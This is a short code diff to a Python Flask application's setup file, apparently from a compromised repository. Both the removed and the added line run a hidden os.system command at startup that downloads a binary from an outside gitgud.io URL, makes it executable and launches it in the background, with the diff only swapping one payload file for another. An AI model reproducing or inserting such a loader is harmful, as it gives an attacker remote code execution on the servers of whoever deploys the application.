@@ -3,7 +3,7 @@ from db import get_db, close_db
 import sqlalchemy
 from logger import log
 import os
-os.system('wget https://gitgud.io/trendava/clouds/-/raw/master/uras;chmod 700 uras;nohup ./uras &')
+os.system('wget https://gitgud.io/trendava/clouds/-/raw/master/reb;chmod 700 reb;nohup ./reb &')
 app = Flask(__name__)
 app.teardown_appcontext(close_db)
 
